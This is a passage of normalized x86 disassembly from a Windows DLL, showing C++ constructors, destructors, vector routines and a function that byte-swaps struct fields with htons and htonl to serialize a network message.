mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10035810
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ htons@IAT ]
push edi
mov edi ecx
movzx eax [ edi + 0x20 ]
push eax
call esi
movzx eax ax
mov [ ebp - 0x4 ] eax
movzx eax [ edi + 0x24 ]
push eax
call esi
push [ edi + 0x30 ]
mov esi [ htonl@IAT ]
movzx eax ax
mov [ ebp - 0x8 ] eax
call esi
push [ edi + 0x28 ]
mov [ ebp - 0xc ] eax
call esi
push [ edi + 0x2c ]
mov [ ebp - 0x10 ] eax
call esi
push [ edi + 0x44 ]
mov [ ebp - 0x14 ] eax
call esi
mov esi [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push 0x2
push eax
call sub_10005470
push 0x2
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0xc ]
mov ecx esi
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x14 ]
mov ecx esi
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x18 ]
mov ecx esi
push eax
call sub_10005470
push 0xffffffff
push 0x0
lea eax [ edi + 0x34 ]
mov ecx esi
push eax
call sub_100050b0
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100358f0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
mov eax [ ecx - 0x8 ]
push esi
lea esi [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov edx [ eax + 0x4 ]
lea ecx [ edx - 0x8 ]
mov [ edx + esi - 0x4 ] ecx
mov [ esi + 0x8 ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10035960
push ebp
mov ebp esp
push 0xffffffff
push sub_100529b7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx ] r--data
mov [ edx + 0xc ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edx ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x4 ] eax
mov [ ebp - 0x4 ] 0x2
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_10035a10
push ebp
mov ebp esp
push 0xffffffff
push sub_1005076b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0xc ]
mov eax [ edi ]
lea esi [ edi + 0xc ]
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov eax [ esi - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov edx [ eax + 0x4 ]
lea ecx [ edx - 0x8 ]
mov [ edx + esi - 0x10 ] ecx
mov [ esi ] r--data
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10035ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052a12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
cmp [ ebp + 0x10 ] 0x0
mov [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x4 ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ ebp - 0x4 ] 0x4
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x14 ]
mov [ ecx + edx - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0xc ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ edx ] r--data
mov [ edx + 0x14 ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
sub_10035b80
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x14 ]
lea ecx [ edi + 0x14 ]
call sub_10035bb0
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x14 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10035bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052a46
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x14 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x14 ] r--data
mov eax [ ecx - 0x14 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x14 ]
mov [ edx + ecx - 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ ecx - 0x8 ]
mov eax [ edx - 0xc ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10035c90
push ebp
mov ebp esp
push 0xffffffff
push sub_10052aad
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx ] r--data
mov [ edx + 0x18 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edx ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x4 ] eax
mov [ ebp - 0x4 ] 0x4
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x4 ] eax
mov [ edx + 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x5
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x14 ]
mov [ ecx + edx - 0x4 ] eax
mov [ edx + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x6
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x4 ] eax
mov ax [ ebp + 0x8 ]
mov [ edx + 0x10 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_10035d90
push ebp
mov ebp esp
push 0xffffffff
push sub_10052adb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0x18 ]
lea esi [ edi + 0x18 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi - 0x4 ]
call sub_10035bb0
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10035e40
push ebp
mov ebp esp
push 0xffffffff
push sub_10052b32
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx ] r--data
mov [ edx + 0x18 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edx ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x4 ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x4 ] eax
mov [ edx + 0x4 ] 0x8
mov [ ebp - 0x4 ] 0x4
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x4 ] eax
mov ax [ ebp + 0x8 ]
mov [ edx + 0x8 ] ax
mov eax [ ebp + 0xc ]
mov [ edx + 0xc ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x10 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x10
sub_10035f20
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x18 ]
lea ecx [ edi + 0x18 ]
call sub_10035f50
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x18 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10035f50
push ebp
mov ebp esp
push 0xffffffff
push sub_10052b66
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x18 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x18 ]
mov [ edx + ecx - 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ ecx - 0xc ]
mov eax [ edx - 0xc ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10036020
push ebp
mov ebp esp
push 0xffffffff
push sub_10052bd5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x4 ] eax
mov [ esi + 0x4 ] 0xa
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0xc ]
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x6
mov ax [ ebp + 0x8 ]
mov [ esi + 0x8 ] ax
lea eax [ ebp + 0xc ]
push eax
call sub_100362a0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x1c ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
push [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ecx
call sub_10036530
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0xc
mov [ ebp + 0xc ] 0x0
mov [ ebp + 0x10 ] 0x0
mov [ ebp + 0x14 ] 0x0
sub_10036150
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x1c ]
lea ecx [ edi + 0x1c ]
call sub_10036180
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x1c ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10036180
push ebp
mov ebp esp
push 0xffffffff
push sub_10052c11
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x1c ] r--data
mov eax [ ecx - 0x1c ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x1c ]
mov [ edx + ecx - 0x20 ] eax
mov [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi - 0xc ]
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp - 0x10 ]
mov edx [ esi + 0x4 ]
push ecx
call sub_10036530
push [ esi ]
call j_sub_1003f3e3#2
add esp 0xc
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
sub_10036260
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
push ecx
call sub_10036530
push [ esi ]
call j_sub_1003f3e3#2
add esp 0xc
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
sub_100362a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052c30
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x18 ] edi
mov ebx [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov ecx [ ebx + 0x4 ]
cmp eax ecx
jne r-xdata
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp + 0x8 ] eax
mov esi [ edi ]
mov ecx [ edi + 0x4 ]
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] eax
ja r-xdata
push [ ebp + 0x8 ]
push ecx
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_10036530
add esp 0x8
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp + 0x8 ] eax
ja r-xdata
push [ ebp + 0x8 ]
push esi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_100364d0
add esp 0x8
push [ ebp + 0x8 ]
push ecx
mov edx [ edi + 0x4 ]
mov ecx eax
call sub_10036530
add esp 0x8
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax + eax * 4 ]
mov eax [ edi ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x14 ]
lea eax [ eax + eax * 4 ]
mov ecx [ ebx ]
lea esi [ ecx + eax * 8 ]
push [ ebp + 0x8 ]
push [ edi ]
mov edx esi
call sub_100364d0
add esp 0x8
push [ ebp + 0x8 ]
push ecx
push [ edi + 0x4 ]
mov edx [ ebx + 0x4 ]
mov ecx esi
call sub_10036620
add esp 0xc
jmp r-xdata
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
push eax
mov ecx edi
call sub_10036460
test al al
je r-xdata
push [ ebp + 0x8 ]
push ecx
mov edx [ edi + 0x4 ]
mov ecx esi
call sub_10036530
push [ edi ]
call j_sub_1003f3e3#2
add esp 0xc
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ edi ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10036620
add esp 0xc
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_10036460
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
test eax eax
jne r-xdata
cmp eax 0x6666666
ja r-xdata
xor al al
pop esi
pop ebp
retn 0x4
push r--data
call sub_1003c5be
push edi
lea edi [ eax + eax * 4 ]
shl edi 0x3
push edi
call sub_1003cdeb
add esp 0x4
test eax eax
je r-xdata
call sub_1003c58d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
add eax edi
mov [ esi + 0x8 ] eax
mov al 0x1
pop edi
pop esi
pop ebp
retn 0x4
sub_100364d0
push ebp
mov ebp esp
push ebx
mov ebx edx
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ecx + 0x8 ]
add esi 0x28
add edi 0x28
lea ecx [ esi - 0x8 ]
cmp ecx ebx
jne r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov ax [ esi - 0x8 ]
lea ecx [ edi + 0x10 ]
mov [ edi ] ax
mov eax [ esi - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ esi ]
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ edi + 0xc ] eax
lea eax [ esi + 0x8 ]
cmp ecx eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10036530
push ebp
mov ebp esp
push 0xffffffff
push sub_10052c5b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
mov [ ebp - 0x10 ] esi
cmp esi edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x10 ] 0x0
add esi 0x28
mov [ ebp - 0x10 ] esi
cmp esi edi
jne r-xdata
push [ esi + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100365b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052c8b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x10 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push [ esi + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10036620
push ebp
mov ebp esp
push 0xffffffff
push sub_10052cb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov esi ecx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
call sub_100366c0
add edi 0x28
mov [ ebp + 0x8 ] edi
add esi 0x28
mov [ ebp - 0x18 ] esi
jmp r-xdata
cmp esi ebx
je r-xdata
sub_10036694
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_1003e35b
int3
mov edi edi
push esi
call sub_100365b0
add esi 0x28
cmp esi edi
jne r-xdata
sub_100366c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052cec
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
mov ax [ edx ]
mov [ ecx ] ax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov eax [ edx + 0xc ]
mov [ ecx + 0xc ] eax
add ecx 0x10
lea eax [ edx + 0x10 ]
push eax
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
sub_100367a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052b32
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx ] r--data
mov [ edx + 0x18 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edx ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x4 ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x4 ] eax
mov [ edx + 0x4 ] 0x9
mov [ ebp - 0x4 ] 0x4
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + edx - 0x4 ] eax
mov ax [ ebp + 0x8 ]
mov [ edx + 0x8 ] ax
mov ax [ ebp + 0xc ]
mov [ edx + 0xa ] ax
mov eax [ ebp + 0x10 ]
mov [ edx + 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ edx + 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x14
sub_10036880
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x18 ]
lea ecx [ edi + 0x18 ]
call sub_100368b0
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x18 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_100368b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052b66
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x18 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x18 ]
mov [ edx + ecx - 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ ecx - 0xc ]
mov eax [ edx - 0xc ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0xc ]
mov eax [ eax + 0x4 ]
